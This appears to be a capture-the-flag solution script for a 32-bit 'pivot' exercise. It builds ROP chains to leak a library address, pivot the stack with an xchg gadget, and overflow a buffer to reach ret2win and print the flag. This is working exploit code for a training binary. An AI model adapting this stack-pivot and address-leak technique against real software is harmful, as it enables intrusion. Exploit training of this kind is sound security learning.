import re
import struct
import sys
from subprocess import PIPE, Popen

ELF = "./pivot32"


def pack(x):
    return struct.pack("<I", x)


def read_until(popen, bytes_):
    reply = b""
    while True:
        reply += popen.stdout.read(1)
        if reply[-len(bytes_) :] == bytes_:
            break
    return reply


def write(popen, bytes_):
    popen.stdin.write(bytes_)
    popen.stdin.flush()


# rabin2 -s ./libpivot32.so  | grep ret2win | awk '{print $2}'
RET2WIN_OFFSET = 0x00000974

# rabin2 -s ./libpivot32.so  | grep foothold_function | awk '{print $2}'
FOOTHOLD_OFFSET = 0x0000077D

# ROPgadget --binary ./pivot32 | grep "xchg esp, eax" | awk '{print $1}'
XCHG_ESP_EAX = pack(0x0804882E)
# ROPgadget --binary ./pivot32 | grep "pop eax" | awk '{print $1}'
POP_EAX = pack(0x0804882C)

# rabin2 -s ./pivot32 | grep foothold_function | awk '{print $3}'
FOOTHOLD_PLT = pack(0x08048520)

# r2 ./pivot32
# pd 1 @ sym.imp.foothold_function | awk -F ";" '{print $2}' | grep -P "0x\w+"
FOOTHOLD_GOT = pack(0x0804A024)

# rabin2 -s ./pivot32 | grep " main" | awk '{print $3}'
MAIN = pack(0x08048686)
# rabin2 -s ./pivot32 | grep "exit" | awk '{print $3}'
EXIT = pack(0x08048510)
# rabin2 -s ./pivot32 | grep puts | awk '{print $3}'
PUTS = pack(0x08048500)

JUNK = b"B" * 44


# Obtain pivot address:
p = Popen(ELF, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = read_until(p, b"> ")
PIVOT_ADDR = pack(int(re.findall(r"0x\w+", reply.decode())[0], 16))

# Write leak foothold chain on the pivoted stack:
leak_foothold = FOOTHOLD_PLT + PUTS + MAIN + FOOTHOLD_GOT
write(p, leak_foothold + b"\n")
read_until(p, b"> ")

# Perform pivot stack with buffer overflow:
pivot_stack = JUNK + POP_EAX + PIVOT_ADDR + XCHG_ESP_EAX
write(p, pivot_stack + b"\n")
read_until(p, b"libpivot\n")

# Fetch leaked foothold address:
FOOTHOLD_ADDR = read_until(p, b"\n").strip()[:4]

# Calculate libpivot lib address and then ret2win address:
FOOTHOLD_ADDR = struct.unpack("<I", FOOTHOLD_ADDR)[0]
LIB_ADDR = FOOTHOLD_ADDR - FOOTHOLD_OFFSET
RET2WIN_ADDR = LIB_ADDR + RET2WIN_OFFSET
RET2WIN = pack(RET2WIN_ADDR)

# Consume all stdout:
reply = read_until(p, b"smash\n> ")

# Smash stack with ret2win return address:
write(p, JUNK + RET2WIN + b"\n")

# Fetch ret2win output:
read_until(p, b"\n")
reply = read_until(p, b"\n").decode()
flag = re.findall(r"ROPE{.+}", reply)[0]

print(flag)
